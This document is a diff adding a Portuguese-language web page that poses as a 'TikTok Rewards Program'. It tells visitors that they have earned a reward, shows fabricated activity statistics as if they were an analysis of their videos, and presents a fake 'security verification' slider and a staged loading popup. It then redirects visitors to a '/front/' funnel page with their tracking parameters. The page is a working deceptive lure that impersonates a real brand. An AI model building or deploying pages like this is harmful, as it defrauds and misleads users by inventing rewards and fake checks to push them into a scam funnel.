@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Programa de Recompensas TikTok</title>
+<meta name="description" content="Você cumpriu todos os critérios de atividade. Desbloqueie seu progresso.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23000'/%3E%3Cpath d='M21 8.5c1.2.8 2.5 1.2 4 1.3v3c-1.4 0-2.7-.4-3.8-1v6.7c0 3.3-2.7 6-6 6s-6-2.7-6-6 2.7-6 6-6c.3 0 .7 0 1 .1v3.1c-.3-.1-.7-.1-1-.1-1.6 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3V8.5h2.8z' fill='%23fff'/%3E%3C/svg%3E">
+<style>
+  :root{
+    --background:hsl(350 60% 95%);
+    --foreground:hsl(220 20% 20%);
+    --card:hsl(0 0% 100%);
+    --card-foreground:hsl(220 20% 20%);
+    --primary:hsl(350 90% 60%);
+    --primary-foreground:hsl(0 0% 100%);
+    --secondary:hsl(350 30% 96%);
+    --muted:hsl(350 20% 94%);
+    --muted-foreground:hsl(220 10% 50%);
+    --border:hsl(350 20% 90%);
+    --success:hsl(142 70% 45%);
+    --radius:1rem;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--background);color:var(--foreground);
+    min-height:100vh;display:flex;align-items:center;justify-content:center;
+    position:relative;overflow-x:hidden;
+  }
+  #particles{position:fixed;inset:0;pointer-events:none;z-index:0}
+  .wrap{position:relative;z-index:10;width:100%;max-width:28rem;margin:0 16px}
+  .card{background:var(--card);border-radius:1rem;box-shadow:0 20px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1);padding:2rem}
+  h1{font-size:1.5rem;line-height:1.25;font-weight:700;color:var(--card-foreground);margin-bottom:.5rem}
+  h1 .p{color:var(--primary)}
+  .desc{font-size:.875rem;color:var(--muted-foreground);margin-bottom:1.5rem;line-height:1.5}
+  .stats{background:var(--secondary);border-radius:.75rem;padding:1rem;margin-bottom:1rem}
+  .stats-h{display:flex;align-items:center;gap:.5rem;margin-bottom:.75rem}
+  .dot{width:.5rem;height:.5rem;border-radius:50%;background:var(--success)}
+  .stats-h span{font-size:.75rem;color:var(--muted-foreground);font-weight:500}
+  .stat{margin-bottom:.75rem}
+  .stat:last-child{margin-bottom:0}
+  .stat-top{display:flex;justify-content:space-between;font-size:.875rem;margin-bottom:.25rem}
+  .stat-top .lbl{color:var(--card-foreground);font-weight:500}
+  .stat-top .val{color:var(--muted-foreground)}
+  .stat-top .val.done{color:var(--success);font-weight:600}
+  .bar{height:6px;background:var(--muted);border-radius:9999px;overflow:hidden}
+  .bar-fill{height:100%;background:var(--primary);border-radius:9999px;width:0;transition:width .7s}
+  .analyzing{font-size:.75rem;color:var(--muted-foreground);text-align:center;margin-bottom:1rem}
+  .btn{width:100%;background:var(--primary);color:var(--primary-foreground);font-weight:600;padding:.75rem;border:none;border-radius:.75rem;display:flex;align-items:center;justify-content:center;gap:.5rem;cursor:pointer;font-size:1rem;transition:opacity .2s}
+  .btn:hover{opacity:.9}
+  .btn:active{transform:scale(.99)}
+  .fine{font-size:10px;color:var(--muted-foreground);text-align:center;margin-top:1rem;line-height:1.4}
+
+  .overlay{position:fixed;inset:0;z-index:50;background:rgba(30,33,44,.4);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;padding:1rem}
+  .modal{background:var(--card);border-radius:1rem;padding:1.5rem;width:100%;max-width:24rem;box-shadow:0 25px 50px -12px rgba(0,0,0,.35)}
+  .modal h2{font-size:1.125rem;font-weight:700;color:var(--card-foreground);text-align:center;margin-bottom:.25rem}
+  .modal .sub{font-size:.75rem;color:var(--muted-foreground);text-align:center;margin-bottom:1.25rem}
+  .track{position:relative;height:3rem;background:var(--muted);border-radius:9999px;user-select:none;touch-action:none}
+  .zone{position:absolute;top:0;height:100%;background:hsla(142 70% 45%/.2);border-radius:9999px}
+  .zone-line{position:absolute;top:0;height:100%;width:2px;background:var(--success)}
+  .fill{position:absolute;top:0;left:0;height:100%;background:hsla(350 90% 60%/.2);border-radius:9999px}
+  .track-txt{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:.75rem;color:var(--muted-foreground);pointer-events:none}
+  .handle{position:absolute;top:4px;width:2.5rem;height:2.5rem;border-radius:50%;background:var(--card);border:2px solid var(--primary);display:flex;align-items:center;justify-content:center;cursor:grab}
+  .handle.on{background:var(--success);border-color:var(--success)}
+  .handle:active{cursor:grabbing}
+  .ok-txt{text-align:center;font-size:.875rem;color:var(--success);font-weight:500;margin-top:.75rem}
+  .modal .note{font-size:10px;color:var(--muted-foreground);text-align:center;margin-top:.75rem}
+
+  .modal-lg{max-width:42rem}
+  .modal-lg h2{font-size:1.5rem;line-height:1.25;text-align:left}
+  .modal-lg .sub{text-align:left;margin-top:.5rem;margin-bottom:1.5rem}
+  .cal{display:flex;justify-content:center;margin-bottom:1.5rem}
+  .cal img{width:9rem;height:9rem;object-fit:contain}
+  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.75rem;margin-bottom:1rem}
+  .pill{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.625rem 0;border-radius:9999px;font-size:.875rem;font-weight:500;border:1px solid var(--border);background:var(--muted);color:var(--muted-foreground);transition:all .5s}
+  .pill.loading{background:hsla(350 90% 60%/.1);color:hsla(350 90% 60%/.6);border-color:hsla(350 90% 60%/.2);animation:pulse 1.2s infinite}
+  .pill.done{background:hsla(142 70% 45%/.15);color:var(--success);border-color:hsla(142 70% 45%/.3)}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+  .pill .check{width:1rem;height:1rem;border-radius:50%;border:2px solid hsla(350 90% 60%/.4);display:flex;align-items:center;justify-content:center;flex:0 0 auto}
+  .pill.done .check{border-color:var(--success);background:var(--success)}
+  .loading-txt{font-size:.75rem;color:var(--muted-foreground);margin-bottom:1rem}
+  .hidden{display:none!important}
+</style>
+</head>
+<body>
+<canvas id="particles"></canvas>
+
+<div class="wrap">
+  <div class="card">
+    <h1>Você cumpriu todos os <span class="p">critérios de atividade.</span></h1>
+    <p class="desc">Confirmamos que a sua conta atende aos requisitos mínimos de uso. Confira o resumo abaixo e toque para desbloquear o seu progresso.</p>
+
+    <div class="stats">
+      <div class="stats-h"><span class="dot"></span><span>Detalhes da sua atividade</span></div>
+      <div id="stats-list"></div>
+    </div>
+
+    <p class="analyzing">Analisando seus vídeos assistidos…</p>
+
+    <button class="btn" id="unlockBtn">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 9.511c.076.954.83 1.697 2.182 1.785V12h.6v-.709c1.4-.098 2.218-.846 2.218-1.932 0-.987-.626-1.496-1.745-1.76l-.473-.112V5.57c.6.068.982.396 1.074.85h1.052c-.076-.919-.864-1.638-2.126-1.716V4h-.6v.719c-1.195.117-2.01.836-2.01 1.853 0 .9.606 1.472 1.613 1.707l.397.098v2.034c-.615-.093-1.022-.43-1.114-.9zm2.177-2.166c-.59-.137-.91-.416-.91-.836 0-.47.345-.822.915-.925v1.76h-.005zm.692 1.193c.717.166 1.048.435 1.048.91 0 .542-.412.914-1.135.982V8.518z"/><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/></svg>
+      Desbloquear meu progresso
+    </button>
+
+    <p class="fine">Os dados acima são gerados automaticamente com base na sua atividade recente na plataforma.</p>
+  </div>
+</div>
+
+<!-- Modal de verificação -->
+<div class="overlay hidden" id="verifyOverlay">
+  <div class="modal" id="verifyBox">
+    <h2>Verificação de Segurança</h2>
+    <p class="sub">Arraste o controle até a área verde para continuar</p>
+    <div class="track" id="track">
+      <div class="zone" id="zone"></div>
+      <div class="zone-line" id="zoneLine"></div>
+      <div class="fill" id="fill"></div>
+      <span class="track-txt" id="trackTxt">Arraste até a área verde →</span>
+      <div class="handle" id="handle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="hsl(350 90% 60%)" stroke-width="2.5" style="width:1.25rem;height:1.25rem"><path d="M9 18l6-6-6-6"/></svg>
+      </div>
+    </div>
+    <p class="ok-txt hidden" id="okTxt">✓ Verificado com sucesso!</p>
+    <p class="note">Solte quando o botão entrar na área verde</p>
+  </div>
+</div>
+
+<!-- Popup de progresso -->
+<div class="overlay hidden" id="progressOverlay">
+  <div class="modal modal-lg">
+    <h2>Parabéns!<br>Você concluiu todas as atividades de 2026<br><span style="color:var(--primary)">Confira o seu progresso!</span></h2>
+    <p class="sub">Estamos carregando o seu histórico mês a mês. Aguarde alguns segundos enquanto confirmamos todas as etapas.</p>
+    <div class="cal"><img src="calendar-illustration.png" alt="Calendário"></div>
+    <div class="grid" id="monthGrid"></div>
+    <p class="loading-txt hidden" id="loadingTxt"></p>
+    <button class="btn hidden" id="redeemBtn">Resgatar progresso</button>
+  </div>
+</div>
+
+<script>
+(function(){
+  // ---- destino do funil (preserva UTMs/parâmetros) ----
+  function irParaFront(){
+    var dest = new URL('/front/', window.location.href);
+    new URLSearchParams(window.location.search).forEach(function(v,k){ dest.searchParams.set(k,v); });
+    window.location.href = dest.toString();
+  }
+
+  // ---- Stats ----
+  var stats = [
+    { label:'Vídeos assistidos', target:50 },
+    { label:'Tempo na plataforma', target:1000 },
+    { label:'Vídeos curtidos', target:100 },
+  ];
+  var listEl = document.getElementById('stats-list');
+  stats.forEach(function(s,i){
+    var d = document.createElement('div'); d.className='stat';
+    d.innerHTML = '<div class="stat-top"><span class="lbl">'+s.label+'</span><span class="val" id="val'+i+'">0/'+s.target+'</span></div><div class="bar"><div class="bar-fill" id="bar'+i+'"></div></div>';
+    listEl.appendChild(d);
+  });
+  stats.forEach(function(s,i){
+    var steps=30, step=0;
+    var t=setInterval(function(){
+      step++;
+      var cur=Math.round((s.target/steps)*Math.min(step,steps));
+      var valEl=document.getElementById('val'+i), barEl=document.getElementById('bar'+i);
+      valEl.textContent=cur+'/'+s.target;
+      barEl.style.width=((cur/s.target)*100)+'%';
+      if(cur>=s.target){ valEl.classList.add('done'); }
+      if(step>=steps) clearInterval(t);
+    },40);
+  });
+
+  // ---- Partículas ----
+  var canvas=document.getElementById('particles'), ctx=canvas.getContext('2d'), parts=[];
+  var colors=['hsla(350,80%,65%,0.5)','hsla(200,80%,70%,0.4)','hsla(350,60%,75%,0.3)','hsla(200,60%,80%,0.3)'];
+  function makeParts(){ parts=[]; for(var i=0;i<20;i++){ parts.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,size:Math.random()*5+2,color:colors[Math.floor(Math.random()*colors.length)],sx:(Math.random()-0.5)*0.4,sy:(Math.random()-0.5)*0.4}); } }
+  function resize(){ canvas.width=window.innerWidth; canvas.height=window.innerHeight; makeParts(); }
+  resize(); window.addEventListener('resize',resize);
+  (function anim(){ ctx.clearRect(0,0,canvas.width,canvas.height); parts.forEach(function(p){ p.x+=p.sx; p.y+=p.sy; if(p.x<0||p.x>canvas.width)p.sx*=-1; if(p.y<0||p.y>canvas.height)p.sy*=-1; ctx.beginPath(); ctx.arc(p.x,p.y,p.size,0,Math.PI*2); ctx.fillStyle=p.color; ctx.fill(); }); requestAnimationFrame(anim); })();
+
+  // ---- Modal de verificação (slider) ----
+  var verifyOverlay=document.getElementById('verifyOverlay');
+  var box=document.getElementById('verifyBox');
+  var track=document.getElementById('track'), zone=document.getElementById('zone'), zoneLine=document.getElementById('zoneLine');
+  var fill=document.getElementById('fill'), handle=document.getElementById('handle'), trackTxt=document.getElementById('trackTxt'), okTxt=document.getElementById('okTxt');
+  var targetZone = 30 + Math.random()*40;
+  var sliderValue=0, verified=false, dragging=false, modalOpen=false;
+  zone.style.left=targetZone+'%'; zone.style.width='30%';
+  zoneLine.style.left=(targetZone+15)+'%';
+
+  function openVerify(){ modalOpen=true; verifyOverlay.classList.remove('hidden'); }
+  function renderSlider(){
+    fill.style.width=sliderValue+'%';
+    handle.style.left='clamp(0px, calc('+sliderValue+'% - 20px), calc(100% - 40px))';
+    trackTxt.style.display=(!verified && sliderValue<5)?'flex':'none';
+  }
+  document.getElementById('unlockBtn').addEventListener('click',openVerify);
+  handle.addEventListener('pointerdown',function(e){ if(verified)return; dragging=true; e.preventDefault(); });
+  box.addEventListener('pointermove',function(e){
+    if(!dragging||verified)return;
+    var rect=track.getBoundingClientRect();
+    var pct=Math.max(0,Math.min(100,((e.clientX-rect.left)/rect.width)*100));
+    sliderValue=pct; renderSlider();
+  });
+  function release(){
+    if(!dragging)return; dragging=false;
+    if(sliderValue>=targetZone && sliderValue<=targetZone+30){
+      verified=true; handle.classList.add('on');
+      handle.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" style="width:1.25rem;height:1.25rem"><path d="M5 13l4 4L19 7"/></svg>';
+      okTxt.classList.remove('hidden'); renderSlider();
+      setTimeout(irParaFront,1000);
+    } else { sliderValue=0; renderSlider(); }
+  }
+  box.addEventListener('pointerup',release);
+  box.addEventListener('pointerleave',release);
+  renderSlider();
+
+  // ---- Popup de progresso (após 20s) ----
+  var monthNames=['Jan','Fev','Mar','Abr','Mai','Jun','Jul','Ago','Set','Out','Nov','Dez'];
+  function getMonths(){
+    var now=new Date(), cm=now.getMonth(), cy=now.getFullYear();
+    var pairs=[], cpi=Math.floor(cm/2);
+    for(var i=0;i<6;i++){ var pi=cpi-i, y=cy; while(pi<0){pi+=6;y-=1;} var m1=pi*2, m2=m1+1; pairs.push({label:(m2+1)+'/'+(m2+1), name:monthNames[m1]+'/'+monthNames[m2]}); }
+    return pairs;
+  }
+  var months=getMonths();
+  var progressOverlay=document.getElementById('progressOverlay');
+  var monthGrid=document.getElementById('monthGrid'), loadingTxt=document.getElementById('loadingTxt'), redeemBtn=document.getElementById('redeemBtn');
+  months.forEach(function(m,i){
+    var d=document.createElement('div'); d.className='pill'; d.id='pill'+i;
+    d.innerHTML='<span class="check"><svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" style="width:.625rem;height:.625rem;display:none"><path d="M5 13l4 4L19 7"/></svg></span>'+m.label;
+    monthGrid.appendChild(d);
+  });
+  var loaded=0;
+  function stepMonth(){
+    if(loaded>=months.length){ loadingTxt.classList.add('hidden'); redeemBtn.classList.remove('hidden'); return; }
+    var pill=document.getElementById('pill'+loaded);
+    if(pill){ pill.classList.add('loading'); }
+    loadingTxt.classList.remove('hidden'); loadingTxt.textContent='Carregando '+months[loaded].name+'…';
+    setTimeout(function(){
+      if(pill){ pill.classList.remove('loading'); pill.classList.add('done'); var sv=pill.querySelector('svg'); if(sv) sv.style.display='block'; }
+      loaded++; stepMonth();
+    },1500);
+  }
+  redeemBtn.addEventListener('click',function(){ progressOverlay.classList.add('hidden'); openVerify(); });
+  setTimeout(function(){ if(!modalOpen){ progressOverlay.classList.remove('hidden'); stepMonth(); } },20000);
+})();
+</script>
+
+</body>
+</html>
